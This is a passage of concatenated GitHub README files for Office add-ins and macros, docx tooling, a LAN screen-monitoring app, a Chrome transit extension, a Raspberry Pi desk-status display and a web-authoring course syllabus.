            OfficeUtils.stopQuietly(officeManager);
        }
    }
}

```

byvlstr,ContextDots,,https://github.com/byvlstr/ContextDots,https://api.github.com/repos/ContextDots/byvlstr,A PowerPoint Macro to see the presentation's progress,"# ContextDots

INTRODUCTION
-------------------------

ContextDots is a Microsoft PowerPoint Macro that empowers people
to do better presentations. It features a ""progress bar"" at each slide's
top to show the global context (PPT calls it 'section') : the
advancement in this specific section, as well as the global progress
among all sections.

Inspired by Latex Beamer ""Frankfurt"", ContextDots is a port to Powerpoint.

ContextDots was written by Valentin Lungenstrass (vlstr) in VBA and is
currently available in version 1.0. This code snippet is Open Source
and can be used and shared by anybody.

![ContextDots Preview](https://raw.githubusercontent.com/byvlstr/ContextDots/master/Preview/Screenshot.png)


INSTRUCTIONS
-------------------------

REQUIREMENTS
+ Microsoft Office 2007+ able to run Macros (Windows RT is not
compatible)
+ Use PowerPoint's ""Section"" feature to separate important parts
+ Keep space free (default is 25 points) at the top (or bottom) of the slide


HOW TO USE IT

1/ Create your presentation by using PowerPoint's ""Section"" feature to
partition your presentation

2/ At any time - mostly at the end - click the ""View"" tab and select
""Macros"" on the very right

3/ Enter a name, e.g. ""ContextDots"", and select ""Create""

4/ Then copy and paste the ContextDots code into the window,
overwriting default code lines

5/ To execute this Macro, press the little (green) ""play"" symbol in the
upper toolbar

6/ ContextDots should now be integrated into your PowerPoint
presentation

NB: If you change something to your slides and want to update the ContextDots bar,
simply select ""View"" -> ""Macros"" -> ""ContextDots"" -> ""Execute""



REMOVE CONTEXTDOTS FROM PRESENTATION

To remove ContextDots from your slides, select ""Edit"" in ""Macros"" and
replace the code with the code in delete_ContextDots



PERSONALIZE CONTEXTDOTS
-------------------------

+ If you want to change the bullets' or background colours, here is a
set of popular colours:

vbBlack, vbRed, vbGreen, vbYellow, vbBlue, vbWhite

If you look for a specific colour, you might want to look for your
colour's RGB values and write ""RGB(r, g, b)"" in the code



+ If you want to change the bullet shape, here is a list of possible
shapes:
https://msdn.microsoft.com/EN-US/library/office/ff862770.aspx


+ If you want to change the bullets' size, change line ""BulletSize = 9""
according to your needs

+ If you want to have the bar at the bottom of your slide, use the other file named ""ContextDots_atTheBottom"". This will put the ContextDots bar at the bottom of your slide. Except the vertical positioning, no other change has been made to this file. All other customization options are still valid.



FAQ
-------------------------

- Can I keep the ContextDots Macro in my Microsoft PowerPoint Macro list? At this moment, there is no (easy) way to keep record of used PPT macros... 

- Will there be a method which doesn't require macro/coding skills? Stay tuned ;)

<img src=""documentation/screenshot.png"">

## Introduction

The BKT consists of 2 parts, the BKT Framework and the BKT Toolbox. The framework offers an easy way to write office add-ins for PowerPoint, Excel, Word, Outlook or Visio in Python. The BKT Toolbox is currently available for PowerPoint, Excel and Visio.

The PowerPoint Toolbox adds multiple tabs that provide structured access to all of PowerPoint's standard features, plus many missing features.

The BKT is developed by us in our spare time, so we cannot offer support or respond to special requests.

### Language

Historically, the BKT was developed in German and unfortunately, we do not have the time to translate the whole toolbox. We hope that most functions are self-explanatory. If you have experience in multi-language python projects, feel free to support us.

### Documentation

Currently, we only have the [GitHub Wiki](https://github.com/pyro-team/bkt-toolbox/wiki) with some English documentation for adventurous users and developers.

## System requirements

The BKT runs under Windows from Office 2010 in all current Office versions. A Mac version is not available because Microsoft does not offer the corresponding Office interface (COM add-in) in the Mac Office.

## Installation

The easiest way to install is via the [Setup](https://github.com/pyro-team/bkt-toolbox/releases/latest) (only for Office 2013+).

Alternatively, you can clone the repository and run the `installer\install.bat` file. After an update, the file may need to be re-run.

***Notes:***

 * There is a separate setup for Office 2010. When cloning the repository, the file `dotnet\build2010.bat` must be executed before installation to compile the addin for Office 2010.
 * The Business Kasper Toolbox is only active in PowerPoint by default after installation, but also available in Excel, Outlook, Word and Visio. There, the BKT can be accessed via the Activate Addin dialog (File > Options > Add-Ins)
 * The Addin dialog can also be used to activate the BKT Dev Plugin. This allows loading and unloading the addin at runtime of the office application.

PowerPointDarkThemeFix does this simple task right.","# PowerPointDarkThemeFix

When a custom (especially dark) theme is applied, default PowerPoint's color picker messes grey colors for fill, borders, shadow and glow. PowerPointDarkThemeFix does this simple task right.

![preview](https://user-images.githubusercontent.com/34414488/127713963-fd0b2e00-a898-4dc9-b4ff-210e53e69aa2.png)

This Add-In adds a new group ""Dark Theme Fix"" to the ""Home"" and ""Drawing Tools"" tabs. This group contains clones of the default PowerPoint color picker and other controls.

A new color picker applies right colors, though, it provides only default color scheme. To use a color scheme provided by the theme, use default controls.

There's also a ""Fix All"" button which will fix all opened presentations.

Check out [project's DeviantArt page](https://www.deviantart.com/matafokka/art/PowerPointDarkThemeFix-887403988) for general discussion.

If you find this Add-In useful, you also might want to get [ExcelDarkThemeFix](https://github.com/matafokka/ExcelDarkThemeFix).

# Installation

## Versions overview

There're four versions of this Add-In, pick one you like the most. If you're not sure, pick **3_columns**, it's the most comfortable, but uses the most horizontal space out of all.

**3_columns** - the way it was intended; there are three columns, every menu has its own button.

![3 cols](https://user-images.githubusercontent.com/34414488/127712015-765a4b80-64c2-4a74-9703-f339294b693a.png)

**2_columns_no_duplicates** - two columns; menus with duplicate functionality has been removed, though, they still can be found in the ""Drawing"" panel.

![2 no defs](https://user-images.githubusercontent.com/34414488/127712013-36589127-b07e-4900-9650-c71075178b37.png)

**two_columns_merged** - two columns; dash options has been merged into ""Dashes"" menu; shadow and glow color menus has been moved to ""Shape Effects"" menu.

![2 merged](https://user-images.githubusercontent.com/34414488/127712011-c6c05d23-0d0a-46e0-8a46-cfc098b2c160.png)

**1_column** - one column; additional fill and dashes menus has been removed; shadow and glow color menus has been moved to ""Shape Effects"" menu; ""Fix All"" button has been moved to all three menus.

![1 col](https://user-images.githubusercontent.com/34414488/127712006-50d0838a-0006-4b79-8557-8211c04d47aa.png)

## Installation process

Basically, you just need to install an Add-In. You can either stick to the instructions below (copied from MS website) or find a better guide.

1. Download [the latest release](https://github.com/matafokka/PowerPointDarkThemeFix/releases/latest). Don't download files by clicking the big green button that says ""Code""! It's sources, you don't need them. Download from the provided link.
1. ""Unblock"" the downloaded file:
    1. Move the cursor over the file, click right mouse button and click ""Properties"".
    1. At the bottom of the window find ""Unblock"" checkbox and check it. Then click ""OK"".
    1. If you don't have this checkbox, please, proceed to the rest of the steps.
1. Move the downloaded file to where it won't get in your way. I'd suggest `%AppData%\Microsoft\AddIns`.
1. Open PowerPoint.
1. Click the ""File"" tab, and then click ""Options"".
1. In the ""Options"" dialog box, click ""Add-Ins"".
1. In the ""Manage"" list at the bottom of the dialog box, click ""PowerPoint Add-ins"", and then click ""Go"".
1. In the ""Add-Ins"" dialog box, click ""Add New"".
1. In the ""Add New PowerPoint Add-In"" dialog box, open a downloaded file, and then click ""OK"".
1. A security notice might appear. Click ""Enable Macros"", and then click ""Close"".

# Compatibility list

Fully compatible with Microsoft Office 2016 and 2019. Should also work with 2010 and 2013, but I've not tested. Don't know about 365.

# Alternative approach to the problem

The problem affects only grey colors (including white and black). The solution is not to use these colors not only because of this problem but because these colors will make your presentation look muddy.

This fact, or rather rule, comes from digital art, and the reason for this is that monitor works differently from paper or any other real life material.

Instead, use shades of grey (or white, or black) with a bit of color added to them. Choose a color that matches your presentation's style.

If you don't have a defined style, pick bluish colors for shadow and yellowish for lights.

Though, there are cases when you'll want to use straight grey colors, such as black and white style, so this Add-In still nice to have.

# FAQ

## Do I need it if I use light theme?

Yes, since it almsot 100% alters system colors which PowerPoint uses.

## Why new color picker is different from the default? Also, why not change existing one?

Because you can't modify the complex default controls such as color picker. Moreover, all color pickers are used only for a specific purpose, there're separate color pickers for different uses. You also can't add submenus to the color picker, it can contain only buttons, and there's no alternative.

## Why there's no color preview on mouse over?

Because there's no such event. This feature is impossible to implement.

## Why there're both new and default controls?

As said earlier, a new color picker provides only default color scheme. Even if it's possible, it would be hard to implement such a feature. So, you still might need default color pickers.

## I have a problem or found a bug. Where can I report it?

Please, fill out an issue on this repository and provide as much information as possible.

If a problem is not related to the grey colors, please, report it too. I'll do my best to fix PowerPoint for you.

## How can I contribute to the project?

If you're regular user, you can test this Add-In with different kinds of presentations and report found issues, or install an older version of Microsoft Office and check if this Add-In works with it.

You can also spread the word about this Add-In (especially in non-English speaking parts of the Internet), so other people could fix their PowerPoint.

本文可能会用到以下简写

vs是visual studio 的简写

wps是金山wps办公软件的简写

### Office(办公软件)扩展

扩展office办公软件的功能，目前示例 扩展excel的Ribbon界面

![https://github.com/zhaoqingqing/OfficeAddin/blob/master/Docs/wps_ribbon.png](https://github.com/zhaoqingqing/OfficeAddin/blob/master/Docs/wps_ribbon.png)

### 运行和测试环境

我的运行和测试环境：

操作系统：windows 10 x64 企业版/专业版，建议Windows 7及以上操作系统。

办公软件：WPS 10个人版、Office365

其它条件：需要安装.NET Framwork 4.0 ，Win7(自带.Net3.5) 如更新过Windows补丁则会更新到.Net4.0 ， WIN8/10用户无需额外安装。

### 使用说明

1. 使用vs生成代码，编译出 ExcelAddIn.dll
2. 双击 **将ExcelAddin添加到注册表.reg**  同时为ms office和wps添加注册项
3. 如果是wps，在菜单栏选择 **开发工具** - **COM加载项** - 添加 **ExcelAddIn.dll** 为加载项 - 点击 **确定**，在菜单栏的ribbon即可看到

如果你不想使用vs编译代码，可以使用我编译好的dll(编译环境为.net 4.0) [ExcelAddin.dll](https://github.com/zhaoqingqing/OfficeAddin/blob/master/ExcelAddIn/release_bin/ExcelAddIn.dll)


### 卸载已安装的加载项

理论上在 **开发工具** - **COM加载项** 删除不需要的加载项。

如果遇到问题，wps请在安装目录下找到ksomisc.exe，双击进行修复。

office请通过更改进行修复。

## Microsoft Office API

经测试wps可以通过COM加载：使用ms office  api 类库编写的接口，所以理论上同一套代码可同时运行于微软的Office办公软件和金山WPS之上。

### Ribbon(界面)



### COM

TODO 知识补充



## 源代码二次开发？

此仓库仅仅是示例，如果你需要扩展更多功能，欢迎Fork此仓库进行修改。

开发工具：建议使用**visual studio 2010及以上版本**，我使用的是visual studio 2017，安装**VSTO(visual studio tool for office)**

项目类型：使用vs新建：Visual C# - Office - SharePoint  - **Excel 2013和2016 VSTO外接程序**

### 生成遇到错误？

0fca,amelia,,https://github.com/0fca/amelia,https://api.github.com/repos/amelia/0fca,LAN monitoring system built in pure Java.,"# Amelia
Amelia is a simple system which monitors state of desktops of all hosts in LAN.

# Structure
Amelia has classical server-client scheme. It uses java.net API to transfer data via TCP.
Amelia system is built from 2 parts: Amelia Server app and <a href=""https://github.com/Obsidiam/ameliaclient"">Alice Client CLI app</a>.
Server app uses multithreading, however there are only 5 threads(os services) that are taking care of view updates, transmission etc. This design is new, the design looked like: one connection = one thread. It caused the memory&CPU usage to be high.
User system was built using RetroFit and ReactiveX for Java. Classical MVC architeconic pattern was implemented. 

App transfers images in JFIF format, resolution is 250x150. App loads all data(image and metadata) to an array which
length is 8192.

**_Important_**: Integer value of first byte in data packet sent by server tells how many bytes counting from index 1 contains bytes of client's machine name.

![Amelia's Frame](https://i.imgur.com/c7dQK9G.png)

## Amelia Server

Amelia can load some settings from .xml file. 
It must be located in the working directory of server app, it is called: init.xml.
The settings recognized by Amelia Server at the moment:
ADDR - IP address to which server should be bound
PORT - port on which server should listen
XML_PATH - the absolute path to other .xml files.


**Note**: Only ADDR and PORT markups are loaded by Amelia, PORT is the one applied at server’s startup.

Actually server is unable to send settings to clients due to its settings panel is in development at the moment.

## Alice

Client app is able to load settings from plain text file called: settings. It must be located in working directory of client app.
The file is supposed to load IP address and port number. 
For an instance, client app will load settings at startup, then it will auto connect to the server using given data. There is a possibility to load settings manually using ‘load’ command. To print list of commands with short description, just type: ‘help’ or ‘?’. In order of applying changes made to settings, the connection must be restarted.

Configuration is saved in two situations: 
* when exiting,
* when the “Connector Thread” is supposed to end its work.
To save settings use command ""save"".

Server app is built using State pattern.

# Features done
Amelia has following features:

* transfers images of screens of every connected client,
* provides data for every single connection like transfer speed, client IP, port,
* simple, light UI,
* shows when started and when ended monitoring process.
Amelia is compatible with:
* Windows 10
* Windows 8
* Windows 7
* Windows Vista
* Windows XP

Amelia should be compatible with all Linux OS's, but I am not sure.

**Amelia Server** was tested on:
* Windows 10,
* Windows 7,
* Windows XP,
* openSUSE 42.2 Leap,
* Mint 18.1.

**Alice** was tested on:
* Windows 10,
* Windows 7,
* Windows XP,
* openSUSE 42.2 Leap,
* Mint 18.1,
* Ubuntu 15.04.

# Incoming features
I want to add following features:

* managable connection settings,
* submission of settings via TCP(or UDP) to every client,
* add more settings like: port, time step,
* remote desktop(using UDP).

# Quick glance
All screens were done while running in environmental conditions, used JRE version is 1.8.144.

pplu,office-365-installation,,https://github.com/pplu/office-365-installation,https://api.github.com/repos/office-365-installation/pplu,Writeup on installing specific versions of Office 365 applications,"# Installing old versions of Office 365

There are cases you may wish to install an old version of your Office 365 applications (Excel, Word, Powerpoint). 

You may find yourself wanting to do this because some automation breaks on you because of an Office update, for example. 
The last time I found this was that in order to migrate data off of a Windows 2008 Server, Excel needed to be working 
correctly. The bad news was that downloading the Office 365 applications installer from my Office 365 subscription would 
not work, since Windows Server 2008 had fallen out of support some time ago.

Luckily, Microsoft can help you :)

# Office Deployment Tool

Welcome [ODT](https://www.microsoft.com/en-us/download/details.aspx?id=49117) (Office Deployment Tool). This utility
helps us download and install any version of Office 365 that has been published. Although its built to help automate 
Office 365 installations, if correctly instructed, we can control the exact version of Office applications that it 
installs. See an overview of its functionality [here](https://docs.microsoft.com/en-us/deployoffice/overview-office-deployment-tool).

All we need to do is to [download ODT](https://www.microsoft.com/en-us/download/details.aspx?id=49117), extract it to 
a directory (`c:\ODT` in this article), and write a configuration file:

# Configuring ODT

ODT is controlled with an XML file. Create a file `office.xml` in `c:\ODT\`:

```
<Configuration>
  <Add Version=""16.0.7571.2109"" OfficeClientEdition=""64"">
    <Product ID=""O365BusinessRetail"">
      <Language ID=""en-us"" />
    </Product>
  </Add>  
</Configuration>
```

Set the `Version` attribute according to the version you want installed.
Office 365 applications seem to be version `16.0`, followed by a *build number* (which you can find on the 
[version history page](https://docs.microsoft.com/en-gb/officeupdates/update-history-microsoft365-apps-by-date).
Note also that this config defaults to the *Current* channel. Take a look at `Channel` attribute, which is documented in
the [configuration options of ODT](https://docs.microsoft.com/en-us/deployoffice/office-deployment-tool-configuration-options).

# Download and install

ODT has different execution modes for preparing or executing different phases of an Office 365 automatic installation. First 
step is to download the Office installer.

Open a `cmd.exe` and `cd c:\ODT`:

```
setup.exe /download office.xml
```

You will see that in `C:\ODT\` that version of Office has been downloaded. Now to install it:

```
setup.exe /configure office.xml
```

Once the installation finishes, the configured build of Office 365 will be available

# docx-to-vfile

[![npm version](https://badge.fury.io/js/docx-to-vfile.svg)](https://badge.fury.io/js/docx-to-vfile) [![npm downloads](https://img.shields.io/npm/dm/docx-to-vfile.svg)](https://www.npmjs.com/package/docx-to-vfile)

Reads a `.docx` file and stores its components in vfile format to be processed by other tools, like [`reoff-parse`](https://github.com/TrialAndErrorOrg/parsers/tree/main/libs/reoff/reoff-parse).

Currently extremely dumb and just stores it all in memory, no streams for you.
File reading does happen in streams.

## What is this?

This package reads a `.docx` file and stores its components in vfile format to be processed by other tools, like [`reoff-parse`][reoff-parse]. This is the first step in a pipeline to convert a `.docx` file to many other formats using the `unified` ecosystem.

A `.docx` document is just a zip file with a bunch of XML and other files (such as images) in it. This package unzips the `.docx` file, reads the XML files and images and stores them in a `VFile` object, which is a virtual file format that can be used by other tools in the `unified` ecosystem.

## When should I use this?

Probably only exclusively to read a `docx` file to feed into `reoff-parse` or something similar, or if you want to access the raw data of a `docx` file for some reason.

## Install

This package is [ESM only](https://gist.github.com/sindresorhus/a39789f98801d908bbc7ff3ecc99d99c). In Node.js (version 12.20+, 14.14+, 16.0+, 18.0+), install as

```bash
pnpm add docx-to-vfile
# or with yarn
# yarn add docx-to-vfile
# or with npm
# npm install docx-to-vfile
```

## Use

### In Node

```ts
import { docxToVFile } from 'docx-to-vfile'
```

Pass a path to a `.docx` file

```ts
const file = await docxToVFile('path/to/file.docx')
```

Pass a `Blob`

```ts
const blob = await fetch('https://path/to/file.docx').then((res) => res.blob())
const file = await docxToVFile(blob)
```

Pass a `Buffer`

```ts
import { readFile } from 'fs/promises'
const buffer = await readFile('path/to/file.docx')
const file = await docxToVFile(buffer)
```

Pass a `ReadStream`

```ts
import { createReadStream } from 'fs'

const file = await docxToVFile(createReadStream('path/to/file.docx'))
```

### In the browser

```ts
import { docxToVFile } from 'docx-to-vfile/browser'
```

Pass a `File`

```html
<input type=""file"" />
```

```ts
document.querySelector('input[type=""file""]')?.addEventListener('change', async (e) => {
  const file = await docxToVFile(e.target.files[0])
})
```

### Output

Using the default settings, the main value of the VFile will be the content of the main document, and the data will contain the content of the other files in the .docx archive. Media files will be stored in the media property.

```ts
const output = {
  data: {
    'word/footnotes.xml': '<?xml version ...',
    '_rels/rels': '<?xml version ...',
    // ...
    relations: {
      rId9: 'footnotes.xml',
      rId8: 'endnotes.xml',
      // ...
    },
    media: {
      media/image1.png: //<Blob>,
    },
  },
  value: //'[the content of word/document.xml, the main document]',
  // other vfile stuff
  messages: [],
  history: [],
  cwd: './',
}

String(output) === output.value // true
```

---

### `Options`

#### Properties

##### `include?`

> `string`[] | `RegExp`[] | (`key`: `string`) => `boolean` | `""all""` | `""allWithDocumentXML""`

Include only the specified files on the `data` attribute of the VFile.
This may be useful if you want to only do something with a subset of the files in the docx file, and don't intend to use 'reoff-stringify' to turn the VFile back into a docx file.

- If an array of strings or regexps is passed, only files that match one of the values will be included.
- If a function is passed, it will be called for each file and should return true to include the file.
- If the value is 'all', almost all files will be included, except for 'word/document.xml', as that already is the root of the VFile.
- If the value is 'allWithDocumentXML', all files will be included, including `word/document.xml`, even though that is already the root of the VFile. Useful if you really want to mimic the original docx file.

You should keep it at the default value if you intend to use 'reoff-stringify' to turn the VFile back into a docx file.

###### Default

'all'

Defined in: [src/lib/docx-to-vfile-unzipit.ts:30](https://github.com/TrialAndErrorOrg/parsers/blob/main/libs/reoff/docx-to-vfile/src/lib/docx-to-vfile-unzipit.ts#L30)

##### `withoutMedia?`

> `boolean`

Whether or not to include media in the VFile.

By default, images are included on the `data.media` attribute of the VFile as an object of ArrayBuffers, which are accessible both client and serverside.

###### Default

false

Defined in: [src/lib/docx-to-vfile-unzipit.ts:16](https://github.com/TrialAndErrorOrg/parsers/blob/main/libs/reoff/docx-to-vfile/src/lib/docx-to-vfile-unzipit.ts#L16)

---

### `XMLOrRelsString`

> `${string}.xml` | `${string}.rels`

Defined in: [src/lib/docx-to-vfile-unzipit.ts:71](https://github.com/TrialAndErrorOrg/parsers/blob/main/libs/reoff/docx-to-vfile/src/lib/docx-to-vfile-unzipit.ts#L71)

## Compatibility

## Security

`docx-to-vfile` currently does not read macros, so it is not vulnerable to potential security issues with macros.

It does not however do any other security checks, so it is possible that maliciously crafted docx files could cause problems when e.g. parsed with `rehype`.

nkapliev,next-bus,,https://github.com/nkapliev/next-bus,https://api.github.com/repos/next-bus/nkapliev,Next Bus is a Chrome extension for staying in touch with your next bus/train/ferry,"## Next Bus

#### What is Next Bus?
Next Bus is a Chrome Browser Extension that helps you to be in touch with your bus/train/ferry and do not miss the next one.  

Available schedules:  
* **Dublin Buses**
* **Irish Rails**
* *[Add your favourite transport API. See [how-to](#how-add-your-bustrainferry-api)]*

#### How it works
![Example of use](assets/readme/example.gif)

#### How add your bus/train/ferry API

That should be easy as hell:  

1. Add your API host to `permissions` section in `app/manifest.json` for fix possible CORS issue  

2. Create new API object at `app/js/src/utils/api.js`. With 3 necessary fields:
  * `url` -- a string with url endpoint to your API. Extension will make http GET request to endpoint once per minute (see `app/js/src/config.js`).   
  * `paramsBuilder` -- a function that should build query object for API request from extension state object.   
  * `responseHandler` -- a function that should handle API response: build object with new data about next buses, or with errors from API.    

3. Add select option for your API to `app/poppup.html`

4. Add icons for your API to `app/icons/`. Read more about icons at https://developer.chrome.com/apps/manifest/icons

If you have any questions, please look at jsDoc in `app/js/src/utils/api.js`.  
Or you could look at [this](https://github.com/nkapliev/next-bus/commit/537771d3f6218cc9e8d54e4b3c2d3d859744e701) commit where I've added new API for Irish Rails.  
Or just ask me ;)

#### The Story
On my previous job, our office building was far far away from the closest metro station.  
Our company provide comfortable buses with a nice schedule to help us get from the metro station to the office and return after a workday back.  
I was always able to open the schedule and find out when I should leave the office to catch the bus just in time and not waiting on a street.  

But if you don't want to miss your next bus, you should always have the schedule opened in front of you.  
Also, you don't need all schedule; you need only the next bus, the one that will get you to home.  
With all this assumptions, my ex-colleague, [@ortemij](https://github.com/ortemij), has created a browser extension [benua-helper](https://github.com/ortemij/benua-helper).  

![Benua](assets/readme/benua.jpg)  
*Benua is a name of the office building in the middle of Saint Petersburg, Russia. It's gorgeous. It was named after Alexandre Benois, famous Russian artist. Look at his [paintings](https://www.wikiart.org/en/alexandre-benois).*  

`benua-helper` was extremely helpful and all our office (700+ people) using it every day.  
Thank you [@ortemij](https://github.com/ortemij) for saving our time so many times! ;)  

When I change my job and move to a different city, I miss that extension a lot.  
After a while, I've decided to create my own schedule-helper-extension.  
Not only for my new office, but with an ability for everyone to add their API for any buses, or trains, or ferries.     

Why I just didn't add some new functionality to `benua-helper`?  
 1. I was wondering how browser extensions work. And the best learning strategy for me is a creating smth from scratch;  
 2. `benua-helper` extension has more specific interface than I need; 
 3. It wasn't clearly how to carefully add a configurable mechanism for city transport data API and do not break everything in `benua-helper`.

A collection of different VBA modules for different applications in MS Office.\
It's broken up by Office application, then Office file intention.\
A speed test section is also included to test different approaches' processing speeds.

All documents contain annotations used by [Rubberduck](https://rubberduckvba.com), an addon to the VBA editor adding lots of useful features, therefore ""bringing it into the 21st century"".\
I'd also recommmend making a few adjustments to the VBA editor's settings as seen in [this Stackoverflow comment](https://stackoverflow.com/a/667225/17239990).

### Excel
* `BasicUtilities` contains modules for automated clearing of specific part with prior confirmation and un-/protecting the document via bindable macro.
* `Finders/DifferingEntriesFinder.bas` lists all entries in a selected sheet's first column that aren't present in the first sheet's first column. Also copys results to clipboard.
* `Finders/UsedColumnsFinder.bas` lists all columns' headers in a text file, whose content isn't the same in every cell.
* `Fixes/ZipCodesFix.bas` fixes the US state abbreviation letters being put in front of the zip code instead of after the city in a table with column names.
* `Imports` contains modules for importing boolean or string values as text info for entries in an Excel sheet from a text or excel file.
* `InventoryUpdating` contains modules for importing data from multiple CSV files with relevant data on the last line into a table in excel, creating a backup of the current worksheet before making changes.
* `ProductionPlanning` contains modules for different calculations related to and needed for planning production, e.g. finding holidays and calculating production capacities.

### Outlook
* `BulkEditContacts.bas` allows for bulk-editing of contacts.
* `JunkMailBlackWhiteList.bas` force-whitelists mails under specified conditions and blacklists all addresses in a provided (linebreak-separated) text file (because ""normal"" rules are limited in max number of mails).
* `MoveFromFolderToFolder.bas` moves all mails from one folder to another reliably one-by-one.
* `MoveToCorrectSentFolder.cls` moves each sent email to the correct mailbox' Sent-elements-folder (Because per default they go into the main account's).

### Speed tests
* `AssignEmptyStringTest.bas` compares different methods to create an empty string.
* `AssignSpaceTest.bas` compares different methods to create a string of a space.
* `CompareNumberTest.bas` compares different methods to compare a number to another.
* `DoesStringStartWithTest.bas` compares different methods to determine if a string starts with another string.
* `DoesStringEndWithTest.bas` compares different methods to determine if a string ends with another string.
* `IsStringEmptyTest.bas` compares different methods to determine if a string is empty.
* `IsStringEqualToStringTest.bas` compares different methods to determine if a string equals another string.
* `IsStringInStringTest.bas` compares different methods to determine if a string contains another string.

### Word
* For `Continual numbering` all three files need to be used to achieve a counter counting the amount of pages printed on the page with the ability to set on print.

This project aims to create an accessible desk-oriented status and check-in system at a low cost at scale. This particular implementation leverages the [Robin](https://robinpowered.com/) platform to retrieve and display desk availability information as well as (optionally) allow touch-less desk check-ins with user NFC/RFID cards/tags.

The code provided here is based on [mini-ticker](https://github.com/jprusik/mini-ticker), which in turn is based on examples from the [pi-rc522](https://github.com/ondryaso/pi-rc522) and [adafruit-circuitpython-ssd1306](https://github.com/adafruit/Adafruit_CircuitPython_SSD1306) projects.

## Requirements

- Raspberry Pi computer with installed header pins and power source
- [compatible](https://www.raspberrypi.org/documentation/installation/sd-cards.md) microSD card
- SSD1306-based 128x64 or 128x32 pixel OLED display
- (Optional) RC522 module (for RFID/NFC communication)

## Setup

**Note:** This project covers the software setup of your desk status device. For hardware models and assembly, see the [desk-status-model](https://github.com/jprusik/desk-status-model) project.

- [Install Raspberry Pi OS Lite](https://www.raspberrypi.org/downloads/raspberry-pi-os/) (formerly, ""Raspbian"") on a microSD/SD card
- Set up the Raspberry Pi to run headless and connect it to your network ([guide](https://www.raspberrypi.org/documentation/configuration/wireless/headless.md))
  - Add a file named `ssh` to the root of the SD card.
  - (Optional) set up your network's wifi configuration by adding a file named `wpa_supplicant.conf` to the root of the SD card. The contents should look like:

    ```config
    ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
    update_config=1
    country=<Insert 2 letter ISO 3166-1 country code here>

    network={
     ssid=""<Name of your wireless LAN>""
     psk=""<Password for your wireless LAN>""
    }
    ```

  - (Optional) Update your device hostname by editing `sudo nano /etc/hostname` and `/etc/hosts` (from ""localhost"") to your desired name.
- [ssh into the Raspberry Pi](https://www.raspberrypi.org/documentation/remote-access/ssh/):
- Do `sudo raspi-config` and set up:
  - ""Interfacing Options"" > ""Interfacing Options"" > ""I2C"" > select ""Yes""
  - (Optional) ""Localisation Options""
  - set your device's timezone (if not set previously) with `timedatectl` (e.g. `sudo timedatectl set-timezone America/New_York`)
  - (Optional) ""Change User Password""
    **Important!** Because we're using Raspberry Pi OS, the default user is `pi` with a password of `raspberry` - it is strongly advised to change the password, at minimum.
- Install dependencies:

  ```shell
  sudo apt update && sudo apt-get install git python3-pip python3-dev libtiff5-dev libopenjp2-7-dev
  ```

- Clone this repo and `cd desk-status`
- Install required packages with `pip3 install -r requirements.txt`
- (Optional) Edit `/boot/config.txt` at the line `dtparam=i2c_arm=on` and replace it with:

  ```shell
  dtparam=i2c_arm=on,i2c_arm_baudrate=400000
  ```

- (Optional) If using an RC522 module for RFID/NFC communication, edit `/boot/config.txt` to include the following settings:

  ```settings
  device_tree_param=spi=on
  dtoverlay=spi-bcm2708
  dtparam=spi=on
  ```

Edit or create `.env` in the same directory as `status_display.py` with the following contents:

```shell
API_ACCESS_TOKEN=""AABBCCDDEEFFGG"" # Your Robin API access token
API_DOMAIN_URL=""api.robinpowered.com"" # The domain for Robin API calls
SEAT_ID=0 # The id of the Robin desk this display is running for
ORG_ID=0 # The id of your Robin organization
TIMEZONE_STRING=""America/New_York"" # The desk's tz database time zone name ('e.g. America/New_York')
API_POLL_INTERVAL=60 # How many seconds to wait before updating the desk status
RED_GPIO=14 # GPIO pin the red led is attached to
GREEN_GPIO=18 # GPIO pin the green led is attached to
BLUE_GPIO=15 # GPIO pin the blue led is attached to
```

## Running the code

Once the `status_display.py` script is executed, it will continue to run until the process is terminated. You can manually execute the script on demand, or automatically execute on shell start by editing `/etc/profile` and appending the following to the end of the file:

```shell
python3 /home/pi/desk-status
```

Alternatively, run the script as a service:

- Run `sudo systemctl --force --full edit deskstatus.service` and enter the config:

  ```config
  [Unit]
  Description=Robin Desk status display
  Requires=network.target
  After=multi-user.target

  [Service]
  WorkingDirectory=/home/pi/desk-status
  User=pi
  ExecStart=python3 .
  ExecStopPost=python3 -c 'import status_display; status_display.shutdown()'

  [Install]
  WantedBy=multi-user.target
  ```

- Enable the service with `sudo systemctl enable --now deskstatus.service`, and start it with `sudo systemctl start deskstatus.service`

## Notes

- This build assumes Raspberry Pi Zero hardware - no other Raspberry Pi hardware has been tested with this code.
- [Ubuntu Font Family](https://design.ubuntu.com/font/) is included in `/fonts` by default. If you wish to use a different font, add them to the `/fonts` directory and update the import references in `status_display.py` (note, line spacing currently presumes Ubuntu fonts and may require adjustments when using other fonts).
- ProTip: You can access the the target pi on your network using the pi's network DNS reference (`raspberrypi` by default). This is particularly useful if your network has dynamic IP address assignment; you can simply `ssh pi@raspberrypi.local`)

# Getting Started

1. Start by cloning the repository: `git clone git@github.com:naskio/docx-viewer.git`
2. Install dependencies: `yarn install`
3. Run forward port script: `yarn forward_port`
4. Create `.env` file : `cp .env.example .env`
5. Add the url generated by `yarn forward_port` to your `.env` file (var `PUBLIC_URL`).
6. Run the server: `yarn start`
7. Open the Docx viewer at [`http://localhost:3000`](http://localhost:3000)
    - Start editing the document `./docx-src/source.js`
8. Save the file `./docx-src/source.js` and see the changes live in your browser.
    - You can find the generated document at `./docx-src/output.docx`

# Syllabus Spring 2019
## Intro to Web Authoring

* **Course Number:** CS1005
* **Professor:** Tomer Libal
* **Office:** SD-09
* **Office Hours:** By appointment on Slack
* **Class Schedule:** Wed 13:45-15:05
* **Credits:** 2

### Course Description
The course introduces the students to working with computers as developers and the HTML/CSS languages. The creation of dynamic and uniform web sites normally requires the use of CSS frameworks. We will learn about their concepts and how to use the Bootstrap CSS framework.
We will also cover the basics of JavaScript.


### Resources

* **Text book:**
  * None is required.

### Schedule

**Week I** Introduction to HTML

**Week II** Codepen, HTML

**Week III** Images, CSS

**Week IV** Links, CSS files

**Week V** Developer tools, Selectors

**Week VI** Flexbox

**Week VII** Midterm exam

**Week VIII** The grid

**Week IX** Frameworks

**Week X** Bootstrap 1

**Week XI** Bootstrap 2

**Week XII** Bootstrap 3

**Week XIII** Javascript

### Attendance Policy
Attendance is mandatory in all classes and attendance affects the grade. In case of three unexcused absents, a grade of ""F"" is automatically given.


IN ALL CASES OF MISSED COURSE MEETINGS, THE RESPONSIBILITY FOR
COMMUNICATION WITH THE PROFESSOR, AND FOR ARRANGING TO MAKE UP MISSED
WORK, RESTS SOLELY WITH THE STUDENT.

Whether an absence is excused or not is ALWAYS up to the discretion of
